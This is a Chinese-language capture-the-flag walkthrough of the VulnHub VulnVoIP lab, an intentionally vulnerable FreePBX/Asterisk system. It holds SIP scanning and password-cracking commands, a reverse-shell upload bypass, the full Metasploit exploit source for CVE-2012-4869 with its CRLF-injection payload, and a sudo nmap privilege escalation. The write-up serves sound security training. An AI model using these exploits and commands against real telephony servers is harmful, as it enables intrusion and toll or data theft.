# HackLAB: VulnVoIP

项目地址：https://download.vulnhub.com/hacklab/vulnVoIP.7z

是一个打包好的镜像文件

**注意：导入 vmx 时一定要选择我已移动，否则没网**

使用 Nmap 扫描出开放服务及操作系统版本

![](https://pic1.imgdb.cn/item/6978b80f9ca240b15f5cc80b.png)

基于 FreePBX (HTTP 80) + Asterisk (5038) + MySQL (3306)，AI 分析给出是 PBX 网络电话系统

对于这种终端设备，我们可以使用工具 `svmap` 扫描拿到精确的版本，[下载地址](https://github.com/EnableSecurity/sipvicious)

`svmap` 是 **SIPVicious** 工具集中的核心扫描器，其本质是一个 **SIP 协议扫描器**。它的唯一目标是定位正在监听 SIP 消息的活跃设备，并获取它们的详细身份信息

在 SIP 协议中，**`User-Agent`** 和 **`Server`** 这两个头部字段类似于 HTTP 协议，其作用是指明发送请求或生成响应的 SIP 用户代理软件（UA）或服务器软件的名称和版本

```bash
SIP/2.0 200 OK
Via: SIP/2.0/UDP 192.168.202.x:5060;branch=z9hG4bK...
From: <sip:100@192.168.202.x>;tag=as12345
To: <sip:192.168.202.159>;tag=as67890
Call-ID: abc12345
CSeq: 101 OPTIONS
Server: Asterisk PBX 1.6.0.26-sme  <-- 【关键信息在这里！】
Allow: INVITE, ACK, CANCEL, OPTIONS, BYE, REFER, SUBSCRIBE, NOTIFY
Supported: replaces
Content-Length: 0
```

```bash
python3 -m sipvicious.svmap 192.168.202.159
```

![](https://pic1.imgdb.cn/item/69794222a3d6d770e81d861a.png)

虽然知道是 PBX，但我们不知道内部具体的**分机号**是多少。没有分机号，就无法进行后续的密码爆破或呼叫劫持

`svwar` 是 SIPVicious 工具集中的**分机枚举工具**，它的主要作用是通过暴力破解或顺序扫描的方式，识别出目标 PBX 系统中真实存在的用户账号（分机号）

```bash
# -D (Auto-Detect)： 它让工具先发送一个探测包，自动检测目标服务器在面对不存在的分机时会返回什么样的错误码（比如 404 Not Found 或 401 Unauthorized）
# -m INVITE (Request Method)： 指定探测方法为 INVITE。默认情况下 svwar 使用 REGISTER
# 因为某些加固过的服务器会严格审计 REGISTER 请求并封禁异常 IP，但对于 INVITE（发起呼叫）通常更宽松
svwar -D -mINVITE 192.168.202.159
```

![](https://pic1.imgdb.cn/item/69795037a3d6d770e81d870a.png)

爆破密码

```bash
python3 -m sipvicious.svcrack -u 2000 -d /usr/share/wordlists/rockyou.txt 192.168.202.159
```

![](https://pic1.imgdb.cn/item/697950b5a3d6d770e81d8715.png)

安装 x-lite，把网络设置为桥接

## 弱口令

### Asterisk PBX

用户 2000，密码 password123

![](https://pic1.imgdb.cn/item/69795165a3d6d770e81d8717.png)

输入密码 0000，然后再按 1，听第一条信息

![](https://pic1.imgdb.cn/item/6979519ca3d6d770e81d874e.png)

```
…Hey Mark, I think the support web access account has been compromised. I have changed the password to securesupport123 all one word and lowercase. You can log on at the usual address. See you in the morning…
```

### FreePBX

```
support:securesupport123
```

![](https://pic1.imgdb.cn/item/69794916a3d6d770e81d8692.png)

## RCE

### Upload moudule

找到一个文件上传模块在 Module Admin 中

![](https://pic1.imgdb.cn/item/69794a93a3d6d770e81d86b6.png)

只能上传压缩文件，绕过方式如下

1. 选创建一个文件夹
2. 将反弹 Shell 放入其中
3. 打包撑 shell-1.0.tgz 的形式，使用 `tar -czvf` 命令（带 -1.0 是要符合网站命令规范）

![](https://pic1.imgdb.cn/item/697952cca3d6d770e81d87ae.png)

上传成功

![](https://pic1.imgdb.cn/item/69794b55a3d6d770e81d86c8.png)

扫描后台找到上传的位置

![](https://pic1.imgdb.cn/item/69794beca3d6d770e81d86d4.png)

进去后看到压缩文件被自动解压缩了

![](https://pic1.imgdb.cn/item/69794bd4a3d6d770e81d86d3.png)

### freepbx_callmenum（2012-4869）

MSF 搜索相关漏洞

![](https://pic1.imgdb.cn/item/697abf59e6c1ecde597e6fad.png)

```ruby
class MetasploitModule < Msf::Exploit::Remote
  Rank = ManualRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'FreePBX 2.10.0 / 2.9.0 callmenum Remote Code Execution',
        'Description' => %q{
          This module exploits FreePBX version 2.10.0,2.9.0 and possibly older.
          Due to the way callme_page.php handles the 'callmenum' parameter, it
          is possible to inject code to the '$channel' variable in function
          callme_startcall in order to gain remote code execution.

          Please note in order to use this module properly, you must know the
          extension number, which can be enumerated or bruteforced, or you may
          try some of the default extensions such as 0 or 200.  Also, the call
          has to be answered (or go to voice).

          Tested on both Elastix and FreePBX ISO image installs.
        },
        'Author' => [ 'muts', 'Martin Tschirsich' ],
        'License' => MSF_LICENSE,
        'References' => [
          [ 'CVE', '2012-4869' ],
          [ 'OSVDB', '80544' ],
          [ 'EDB', '18649' ]
        ],
        'Platform' => ['unix'],
        'Arch' => ARCH_CMD,
        'Privileged' => false,
        'Payload' => {
          'Space' => 1024,
          'DisableNops' => true,
        },
        'Targets' => [
          [ 'Automatic Target', {}]
        ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2012-03-20',
        'Notes' => {
          'Reliability' => UNKNOWN_RELIABILITY,
          'Stability' => UNKNOWN_STABILITY,
          'SideEffects' => UNKNOWN_SIDE_EFFECTS
        }
      )
    )

    register_options(
      [
        OptString.new("EXTENSION", [ true, "A range of Local extension numbers", "0-100" ]),
      ]
    )
  end

  def exploit
    # Check range input
    if datastore['EXTENSION'] =~ /^(\d+)\-(\d+)$/
      min = $1.to_i
      max = $2.to_i
    else
      print_error("Please specify a range for option 'EXTENSION'")
      return
    end

    cmd = Rex::Text.uri_encode(payload.encoded)

    (min..max).each do |e|
      connect
      print_status("#{rhost}:#{rport} - Sending evil request with range #{e.to_s}")
      res = send_request_raw({
        'method' => 'GET',
        'uri' => "/recordings/misc/callme_page.php?action=c&callmenum=" + e.to_s + "@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20#{cmd}%0D%0A%0D%0A",
        'version' => '1.0',
        'vhost' => rhost
      })
      handler
      disconnect
    end
  end
end
```

该漏洞存在于 `callme_page.php` 脚本中

当用户调用该页面时，系统会尝试启动一个呼叫任务，而关键参数 `callmenum` 没有经过任何过滤，就直接参与了 **Asterisk 呼叫文件（Call File）** 的拼接

Asterisk 系统使用一种特定格式的文本文件（通常位于 `/var/spool/asterisk/outgoing/`）来发起呼叫

这些文件的格式是基于 `Key: Value` 的

生成呼叫逻辑是：

```http
Channel: Local/200@from-internal/n
Application: Playback
...
```

注入的 Payload

```http
...callme_page.php?action=c&callmenum=200@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20[PAYLOAD]
```

可以看出来注入原理就是 **CRLF** 注入

代码中的 `%0D%0A` 代表回车换行。通过注入这两个字符，攻击者可以**终结当前配置行并伪造新的配置行**

注入后的呼叫文件变成了：

```http
Channel: Local/200@from-internal/n  <-- 原本的行
Application: system                 <-- 注入的行：修改任务为执行系统命令
Data: [你的恶意代码]                 <-- 注入的行：提供命令参数
```

## 提权

### Python 升级为交互式 Shell

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

发现给了 `nmap` 和 `yum` 的高权限

![](https://pic1.imgdb.cn/item/69794c35a3d6d770e81d86e0.png)

### NMap 交互模式提权

利用其交互模式新建 Shell 提权

```bash
sudo nmap --interactive
!sh
```

![](https://pic1.imgdb.cn/item/69794cb1a3d6d770e81d86ec.png)

